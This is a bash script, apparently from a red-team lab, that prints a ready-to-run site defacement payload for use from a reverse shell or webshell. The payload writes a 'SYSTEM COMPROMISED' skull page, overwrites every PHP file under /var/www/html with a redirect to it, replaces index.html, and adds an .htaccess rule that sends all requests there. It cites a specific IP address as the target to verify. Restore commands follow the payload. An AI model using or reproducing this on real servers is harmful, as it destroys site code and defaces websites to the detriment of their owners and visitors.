#!/bin/bash
echo "============================================================"
echo "💀 전체 사이트 Defacement (모든 페이지)"
echo "============================================================"
echo ""
echo "리버스 쉘 또는 웹쉘에서 실행:"
echo ""
cat << 'SHELLEOF'
# 1. 먼저 hacked.html 생성
cat > /var/www/html/hacked.html << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>HACKED</title><style>*{margin:0;padding:0;box-sizing:border-box}body{background:#000;color:#0f0;font-family:'Courier New',monospace;overflow:hidden;display:flex;justify-content:center;align-items:center;height:100vh}.container{text-align:center;animation:glitch 1s infinite}.skull{font-size:12px;line-height:1.2;white-space:pre;text-shadow:0 0 10px #0f0}h1{font-size:4em;margin:30px 0;text-shadow:0 0 20px #f00,0 0 40px #f00;animation:blink .5s infinite;color:#f00}.message{font-size:1.5em;margin:20px 0;text-shadow:0 0 10px #0f0}.info{font-size:1em;margin-top:30px;opacity:.8}@keyframes blink{0%,50%,100%{opacity:1}25%,75%{opacity:.3}}@keyframes glitch{0%{transform:translate(0)}20%{transform:translate(-2px,2px)}40%{transform:translate(-2px,-2px)}60%{transform:translate(2px,2px)}80%{transform:translate(2px,-2px)}100%{transform:translate(0)}}.matrix{position:fixed;top:0;left:0;width:100%;height:100%;opacity:.1;z-index:-1}</style></head><body><canvas class="matrix"></canvas><div class="container"><div class="skull">       _.--""-._
    ."         ".
   /             \
  |               |
  |,  .-.  .-.  ,|
  | )(__/  \__)( |
  |/     /\     \|
(@_(_     ^^     _)
   \_/|_____|\__________/|
      \______/  \______/  \
     .'   _..|..  .._   '.
    /    /  ___\___  \    \
   /    /  / _ \/ _ \  \    \
  /    /  / /_\ /_\ \  \    \
 /    /  / _    _   \  \    \
/    /  / / \  / \   \  \    \
/    /  / /   \/   \   \  \    \
/____/  /_/          \_\ \____\</div><h1>SYSTEM COMPROMISED</h1><div class="message">> Your system has been penetrated<br>> All vulnerabilities exploited<br>> Data has been exfiltrated</div><div class="info">[SQL Injection: BYPASSED]<br>[File Upload: EXPLOITED]<br>[XSS: INJECTED]<br>[CSRF: EXECUTED]<br>[Database: COMPROMISED]<br>[Session: HIJACKED]<br><br>PENETRATION TEST SUCCESSFUL<br><br>-- Red Team --</div></div><script>const canvas=document.querySelector('.matrix');const ctx=canvas.getContext('2d');canvas.width=window.innerWidth;canvas.height=window.innerHeight;const matrix="ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789@#$%^&*()*&^%";const fontSize=10;const columns=canvas.width/fontSize;const drops=[];for(let i=0;i<columns;i++){drops[i]=1}function draw(){ctx.fillStyle='rgba(0,0,0,0.04)';ctx.fillRect(0,0,canvas.width,canvas.height);ctx.fillStyle='#0F0';ctx.font=fontSize+'px monospace';for(let i=0;i<drops.length;i++){const text=matrix[Math.floor(Math.random()*matrix.length)];ctx.fillText(text,i*fontSize,drops[i]*fontSize);if(drops[i]*fontSize>canvas.height&&Math.random()>.975){drops[i]=0}drops[i]++}}setInterval(draw,35);setInterval(()=>{document.body.style.filter='hue-rotate('+Math.random()*360+'deg)';setTimeout(()=>{document.body.style.filter='none'},50)},3000)</script></body></html>
HTMLEOF

# 2. 주요 PHP 파일 찾기 및 백업
echo "[*] 주요 파일 백업 중..."
find /var/www/html -name "*.php" -type f -exec cp {} {}.bak \;

# 3. 모든 PHP 파일을 hacked.html로 리다이렉트하는 PHP 코드로 덮어쓰기
echo "[*] 모든 PHP 파일에 리다이렉트 주입 중..."
find /var/www/html -name "*.php" -type f -exec sh -c 'echo "<?php header(\"Location: /hacked.html\"); exit; ?>" > "$1"' _ {} \;

# 4. index.html이 있다면 덮어쓰기
if [ -f /var/www/html/index.html ]; then
    cp /var/www/html/index.html /var/www/html/index.html.bak
    cp /var/www/html/hacked.html /var/www/html/index.html
fi

# 5. www 서브디렉토리가 있다면 거기도 적용
if [ -d /var/www/html/www ]; then
    cp /var/www/html/hacked.html /var/www/html/www/hacked.html
    find /var/www/html/www -name "*.php" -type f -exec sh -c 'echo "<?php header(\"Location: /hacked.html\"); exit; ?>" > "$1"' _ {} \;
    if [ -f /var/www/html/www/index.html ]; then
        cp /var/www/html/www/hacked.html /var/www/html/www/index.html
    fi
fi

# 6. .htaccess로 모든 요청 리다이렉트
echo "[*] .htaccess 생성 중..."
cat > /var/www/html/.htaccess << 'HTEOF'
# Redirect all requests to hacked.html
RewriteEngine On
RewriteCond %{REQUEST_URI} !^/hacked\.html$
RewriteRule ^(.*)$ /hacked.html [L,R=302]
HTEOF

echo "[✓] 완료!"
echo ""
echo "확인:"
echo "http://52.78.221.104/ (어떤 경로든)"
echo "http://52.78.221.104/login.php"
echo "http://52.78.221.104/profile.php"
echo "http://52.78.221.104/anything"
echo ""
echo "→ 모두 해골 화면으로 리다이렉트됩니다!"
SHELLEOF

echo ""
echo "============================================================"
echo ""
echo "복구 방법:"
echo "------------------------------------------------------------"
cat << 'RESTOREEOF'
# 1. .htaccess 삭제
rm /var/www/html/.htaccess

# 2. PHP 파일 복구
find /var/www/html -name "*.php.bak" -type f -exec sh -c 'mv "$1" "${1%.bak}"' _ {} \;

# 3. index.html 복구 (있을 경우)
if [ -f /var/www/html/index.html.bak ]; then
    mv /var/www/html/index.html.bak /var/www/html/index.html
fi

# 4. hacked.html 삭제
rm /var/www/html/hacked.html
RESTOREEOF

echo ""
echo "============================================================"
EOF
cat /Users/hwangjunha/Desktop/Red_basic_local/H/deploy_total_defacement.sh
